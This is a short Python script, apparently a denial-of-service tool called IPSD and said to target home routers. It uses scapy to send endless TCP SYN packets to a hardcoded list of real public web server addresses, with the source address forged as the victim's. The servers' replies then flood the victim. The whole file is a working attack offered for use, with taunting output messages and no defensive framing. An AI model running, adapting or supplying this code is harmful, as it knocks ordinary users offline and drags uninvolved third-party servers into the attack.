#!/usr/bin/python3
"""
IPSD
----------------------------------
author: mr.akz

Meant to target home routers!
"""
from os import system
from scapy.all import *
from random import randint


def randInt():
        rannum = randint(1000,9000)
        return rannum

def blast(source, dstIP,dstPort):
        total = 0

        for x in range(9999999999999):
                s_port = 5000
                s_eq = randInt()
                w_indow = randInt()

                IP_Packet = IP ()
                IP_Packet.src = source
                IP_Packet.dst = dstIP

                TCP_Packet = TCP ()
                TCP_Packet.sport = s_port
                TCP_Packet.dport = 80
                TCP_Packet.flags = "S"
                TCP_Packet.seq = s_eq
                TCP_Packet.window = w_indow

                send(IP_Packet/TCP_Packet, verbose=0)
                total+=1
        print(f"Sent {total} packets")
def blast2(source, dstIP,dstPort):
        total = 0

        for x in range(9999999999999):
                s_port = 5000
                s_eq = randInt()
                w_indow = randInt()

                IP_Packet = IPv6 ()
                IP_Packet.src = source
                IP_Packet.dst = dstIP

                TCP_Packet = TCP ()
                TCP_Packet.sport = s_port
                TCP_Packet.dport = 80
                TCP_Packet.flags = "S"
                TCP_Packet.seq = s_eq
                TCP_Packet.window = w_indow

                send(IP_Packet/TCP_Packet, verbose=0)
                total+=1
        print(f"Sent {total} packets")
webip = ["66.254.114.41","128.116.102.3","142.251.40.206","74.6.231.21","104.16.44.196","142.250.65.229","52.96.222.194","204.79.197.200","54.84.236.175","162.159.128.233","108.139.29.88","140.82.113.4","104.20.68.143","104.16.149.244","104.127.170.77","23.54.221.68","23.22.13.113","142.251.41.14","20.231.114.24","20.70.246.20","88.99.213.221","151.101.0.223","72.14.180.202","95.173.128.90","87.242.66.56","104.244.42.129","185.88.181.6","104.18.184.10","137.75.88.52","162.241.216.98","165.155.103.63","205.251.242.103","209.140.136.23","18.164.96.16","31.13.71.174","157.240.241.35","104.21.9.214","190.115.31.91","91.215.42.4"]
try:
    src = input('Target => ')
    x = 1
    if '.' in src:
        print(f"IPSD sh!tting on {src}")
        for ip in webip:
            blast(src, ip, 80)
    elif ':' in src:
        print(f"IPSD sh!tting on {src}")
        for ip in webip:
            blast2(src, ip, 80)
    else:
        print("invalid ip")
except Exception as Error:
    print(Error)
